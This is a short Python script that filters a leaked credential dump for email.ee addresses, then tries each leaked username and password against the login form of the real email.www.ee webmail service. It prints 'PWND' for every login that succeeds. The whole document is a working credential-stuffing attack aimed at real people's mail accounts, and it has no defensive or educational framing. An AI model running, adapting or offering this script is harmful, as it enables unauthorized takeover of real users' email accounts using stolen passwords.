# with open('seemnemaailm-leak.txt') as f:
#     with open('email-ee.txt', 'w') as out:
#         for line in f.readlines():
#             email = line.split(',')[2]
#             password = line.split(',')[3]
#             if email.endswith('email.ee'):
#                 out.write(email + ' ' + password)
import re

import bs4
import requests

page = 'http://email.www.ee/atmail.php'
payload = {
    'username': None,
    'pop3host': 'email.ee',
    'password': None,
    'LoginType': 'simple',
    'NewWindow': 0,
    'Language': '',
    'Submit': 'Sisene'
}
headers = {'User-Agent': 'Mozilla/5.0'}
session = requests.Session()

with open('email-ee.txt') as f:
    for line in f.readlines():
        usr, psw = line.split(' ')
        payload['username'] = usr.strip()
        payload['password'] = psw.strip()
        print(payload)
        response = session.post(page, headers=headers, data=payload)
        soup = bs4.BeautifulSoup(response.text)
        if soup.body.findAll(text=re.compile('showmail')):
            print('PWND')
